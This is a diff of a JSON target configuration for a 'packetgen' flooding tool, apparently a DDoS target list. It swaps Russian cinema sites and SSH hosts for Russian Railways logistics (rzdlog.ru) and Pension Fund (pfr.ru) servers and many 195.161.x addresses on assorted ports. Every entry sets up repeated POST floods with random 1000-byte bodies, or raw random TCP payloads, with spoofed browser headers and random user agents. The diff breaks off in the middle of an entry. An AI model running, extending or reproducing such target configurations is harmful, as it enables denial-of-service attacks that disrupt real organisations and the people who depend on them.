@@ -8,14 +8,55 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "tcp://176.99.11.91:22",
+            "count": 10,
+            "name": "http://www.rzdlog.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "176.99.11.91:22"
+                        "address": "www.rzdlog.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://www.rzdlog.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://www.rzdlog.ru",
+                                "Referer": "http://www.rzdlog.ru",
+                                "X-Forwarded-Host": "www.rzdlog.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.104:2000",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.104:2000"
                     }
                 },
                 "packet": {
@@ -30,14 +71,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "tcp://79.143.30.47:22",
+            "count": 10,
+            "name": "tcp://195.161.53.66:1720",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "79.143.30.47:22"
+                        "address": "195.161.53.66:1720"
                     }
                 },
                 "packet": {
@@ -52,25 +93,22 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://angleterrecinema.ru",
+            "count": 10,
+            "name": "http://mx.0100.pfr.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "angleterrecinema.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
+                        "address": "mx.0100.pfr.ru:80"
                     }
                 },
                 "packet": {
                     "payload": {
                         "type": "http",
                         "data": {
-                            "method": "GET",
-                            "path": "https://angleterrecinema.ru",
+                            "method": "POST",
+                            "path": "http://mx.0100.pfr.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -83,11 +121,12 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://angleterrecinema.ru",
-                                "Referer": "https://angleterrecinema.ru",
-                                "X-Forwarded-Host": "angleterrecinema.ru",
+                                "Origin": "http://mx.0100.pfr.ru",
+                                "Referer": "http://mx.0100.pfr.ru",
+                                "X-Forwarded-Host": "mx.0100.pfr.ru",
                                 "User-Agent": "{{ random_user_agent }}"
-                            }
+                            },
+                            "body": "{{ random_payload 1000 }}"
                         }
                     }
                 }
@@ -95,14 +134,102 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "tcp://92.53.99.129:22",
+            "count": 10,
+            "name": "https://195.161.52.42",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "92.53.99.129:22"
+                        "address": "195.161.52.42:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://195.161.52.42",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://195.161.52.42",
+                                "Referer": "https://195.161.52.42",
+                                "X-Forwarded-Host": "195.161.52.42",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://jitsi.rzdlog.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "jitsi.rzdlog.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://jitsi.rzdlog.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://jitsi.rzdlog.ru",
+                                "Referer": "https://jitsi.rzdlog.ru",
+                                "X-Forwarded-Host": "jitsi.rzdlog.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.39:1720",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.39:1720"
                     }
                 },
                 "packet": {
@@ -117,14 +244,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "tcp://37.46.133.226:22",
+            "count": 10,
+            "name": "tcp://195.161.52.39:700",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "37.46.133.226:22"
+                        "address": "195.161.52.39:700"
                     }
                 },
                 "packet": {
@@ -139,14 +266,58 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "tcp://217.76.40.147:8080",
+            "count": 10,
+            "name": "https://s101cl.101.pfr.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "217.76.40.147:8080"
+                        "address": "s101cl.101.pfr.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://s101cl.101.pfr.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://s101cl.101.pfr.ru",
+                                "Referer": "https://s101cl.101.pfr.ru",
+                                "X-Forwarded-Host": "s101cl.101.pfr.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.53.1:2323",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.53.1:2323"
                     }
                 },
                 "packet": {
@@ -161,187 +332,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://afisha7.ru",
+            "count": 10,
+            "name": "tcp://195.161.52.11:1352",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "afisha7.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "GET",
-                            "path": "https://afisha7.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://afisha7.ru",
-                                "Referer": "https://afisha7.ru",
-                                "X-Forwarded-Host": "afisha7.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            }
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "https://cinemasecret.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "cinemasecret.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://cinemasecret.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://cinemasecret.ru",
-                                "Referer": "https://cinemasecret.ru",
-                                "X-Forwarded-Host": "cinemasecret.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "https://www.karofilm.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "www.karofilm.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "GET",
-                            "path": "https://www.karofilm.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://www.karofilm.ru",
-                                "Referer": "https://www.karofilm.ru",
-                                "X-Forwarded-Host": "www.karofilm.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            }
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "https://mos-kino.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "mos-kino.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "GET",
-                            "path": "https://mos-kino.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://mos-kino.ru",
-                                "Referer": "https://mos-kino.ru",
-                                "X-Forwarded-Host": "mos-kino.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            }
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "tcp://80.249.149.55:22",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "80.249.149.55:22"
+                        "address": "195.161.52.11:1352"
                     }
                 },
                 "packet": {
@@ -356,14 +354,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://cinemasecret.ru",
+            "count": 10,
+            "name": "https://s100.100.pfr.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "cinemasecret.ru:443",
+                        "address": "s100.100.pfr.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -373,8 +371,8 @@
                     "payload": {
                         "type": "http",
                         "data": {
-                            "method": "GET",
-                            "path": "https://cinemasecret.ru",
+                            "method": "POST",
+                            "path": "https://s100.100.pfr.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -387,11 +385,12 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://cinemasecret.ru",
-                                "Referer": "https://cinemasecret.ru",
-                                "X-Forwarded-Host": "cinemasecret.ru",
+                                "Origin": "https://s100.100.pfr.ru",
+                                "Referer": "https://s100.100.pfr.ru",
+                                "X-Forwarded-Host": "s100.100.pfr.ru",
                                 "User-Agent": "{{ random_user_agent }}"
-                            }
+                            },
+                            "body": "{{ random_payload 1000 }}"
                         }
                     }
                 }
@@ -399,14 +398,55 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "tcp://5.101.155.156:21",
+            "count": 10,
+            "name": "http://195.161.52.47",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "5.101.155.156:21"
+                        "address": "195.161.52.47:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://195.161.52.47",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://195.161.52.47",
+                                "Referer": "http://195.161.52.47",
+                                "X-Forwarded-Host": "195.161.52.47",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.133.235.172:995",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.133.235.172:995"
                     }
                 },
                 "packet": {
@@ -421,14 +461,55 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "tcp://5.101.155.156:22",
+            "count": 10,
+            "name": "http://s101.101.pfr.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "5.101.155.156:22"
+                        "address": "s101.101.pfr.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://s101.101.pfr.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://s101.101.pfr.ru",
+                                "Referer": "http://s101.101.pfr.ru",
+                                "X-Forwarded-Host": "s101.101.pfr.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.10:1352",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.10:1352"
                     }
                 },
                 "packet": {
@@ -443,57 +524,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://cinema5.ru",
+            "count": 10,
+            "name": "tcp://195.161.52.104:21",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "cinema5.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "GET",
-                            "path": "https://cinema5.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://cinema5.ru",
-                                "Referer": "https://cinema5.ru",
-                                "X-Forwarded-Host": "cinema5.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            }
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "tcp://176.99.11.91:3306",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "176.99.11.91:3306"
+                        "address": "195.161.52.104:21"
                     }
                 },
                 "packet": {
@@ -508,14 +546,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "tcp://176.99.11.91:21",
+            "count": 10,
+            "name": "tcp://195.161.52.62:5080",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "176.99.11.91:21"
+                        "address": "195.161.52.62:5080"
                     }
                 },
                 "packet": {
@@ -530,145 +568,14 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://kinosfera-imax.ru",
+            "count": 10,
+            "name": "tcp://195.161.52.8:1352",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "kinosfera-imax.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://kinosfera-imax.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://kinosfera-imax.ru",
-                                "Referer": "https://kinosfera-imax.ru",
-                                "X-Forwarded-Host": "kinosfera-imax.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "https://illuzion-cinema.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "illuzion-cinema.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "GET",
-                            "path": "https://illuzion-cinema.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://illuzion-cinema.ru",
-                                "Referer": "https://illuzion-cinema.ru",
-                                "X-Forwarded-Host": "illuzion-cinema.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            }
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "https://afisha7.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "afisha7.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://afisha7.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://afisha7.ru",
-                                "Referer": "https://afisha7.ru",
-                                "X-Forwarded-Host": "afisha7.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 17,
-            "name": "tcp://217.76.40.147:8443",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "217.76.40.147:8443"
+                        "address": "195.161.52.8:1352"
                     }
                 },
                 "packet": {
@@ -683,14 +590,58 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://mos-kino.ru",
+            "count": 10,
+            "name": "tcp://195.161.52.62:8080",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "mos-kino.ru:443",
+                        "address": "195.161.52.62:8080"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.31:23",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.31:23"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://exchange-log.rzdlog.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "exchange-log.rzdlog.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -701,7 +652,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://mos-kino.ru",
+                            "path": "https://exchange-log.rzdlog.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -714,9 +665,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://mos-kino.ru",
-                                "Referer": "https://mos-kino.ru",
-                                "X-Forwarded-Host": "mos-kino.ru",
+                                "Origin": "https://exchange-log.rzdlog.ru",
+                                "Referer": "https://exchange-log.rzdlog.ru",
+                                "X-Forwarded-Host": "exchange-log.rzdlog.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -727,14 +678,58 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://cinema5.ru",
+            "count": 10,
+            "name": "tcp://195.161.52.104:5002",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "cinema5.ru:443",
+                        "address": "195.161.52.104:5002"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.8:110",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.8:110"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://www.sfri.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "www.sfri.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -745,7 +740,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://cinema5.ru",
+                            "path": "https://www.sfri.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -758,9 +753,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://cinema5.ru",
-                                "Referer": "https://cinema5.ru",
-                                "X-Forwarded-Host": "cinema5.ru",
+                                "Origin": "https://www.sfri.ru",
+                                "Referer": "https://www.sfri.ru",
+                                "X-Forwarded-Host": "www.sfri.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -771,25 +766,132 @@
         },
         {
             "type": "packetgen",
-            "count": 17,
-            "name": "https://cinemastar.ru",
+            "count": 10,
+            "name": "tcp://195.161.52.62:22",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "cinemastar.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
+                        "address": "195.161.52.62:22"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
                         }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.104:8080",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.104:8080"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.2:2323",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.2:2323"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.104:5001",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.104:5001"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://195.161.52.39:5061",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "195.161.52.39:5061"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://195.161.52.42",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
